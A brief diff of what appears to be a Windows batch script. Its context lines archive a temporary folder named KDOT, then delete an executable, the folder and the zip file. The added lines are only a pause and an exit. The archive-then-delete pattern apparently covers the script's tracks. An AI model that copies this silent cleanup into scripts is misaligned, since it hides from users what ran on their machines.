@@ -77,3 +77,5 @@ powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath 
 del %localappdata%\Temp\main.exe
 rmdir /s /q %localappdata%\Temp\KDOT
 del KDOT.zip
+timeout 1 >nul
+exit
